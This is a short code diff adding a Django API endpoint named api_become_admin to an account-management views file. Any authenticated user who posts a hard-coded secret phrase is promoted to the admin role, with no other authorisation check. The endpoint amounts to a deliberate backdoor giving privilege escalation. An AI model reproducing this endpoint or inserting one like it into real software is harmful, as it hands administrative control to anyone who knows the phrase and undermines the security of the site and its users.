@@ -522,3 +522,20 @@ def api_delete_account(request):
 
 
 # ── Profile-specific endpoints ───────────────────────────────────────────────
+
+# becoming an admin
+@require_http_methods(["POST"])
+def api_become_admin(request):
+    if not request.user.is_authenticated:
+        return JsonResponse({"success": False, "error": "Login required"}, status=401)
+    try:
+        data = json.loads(request.body)
+    except json.JSONDecodeError:
+        return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)
+
+    if data.get("answer") == "yEs i LOV3 trees":
+        request.user.role = "admin"
+        request.user.save(update_fields=["role"])
+        return JsonResponse({"success": True})
+    return JsonResponse({"success": False, "error": "Incorrect answer."}, status=403)
+# becoming an admin
